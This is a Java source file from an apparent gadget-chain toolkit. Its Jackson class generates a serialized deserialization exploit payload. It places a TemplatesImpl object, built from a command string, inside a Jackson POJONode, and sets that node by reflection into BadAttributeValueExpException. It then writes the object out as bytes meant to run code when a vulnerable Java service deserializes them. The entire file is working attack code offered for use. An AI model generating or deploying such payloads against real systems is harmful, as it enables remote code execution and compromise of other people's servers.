package org.gadget;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Jackson {
    public static byte[] getBytes(String common) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(common);
        POJONode node = new POJONode(template);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        //反射设置val属性
        Field val1 = val.getClass().getDeclaredField("val");
        val1.setAccessible(true);
        val1.set(val, node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(val);
        return byteArrayOutputStream.toByteArray();
    }
}
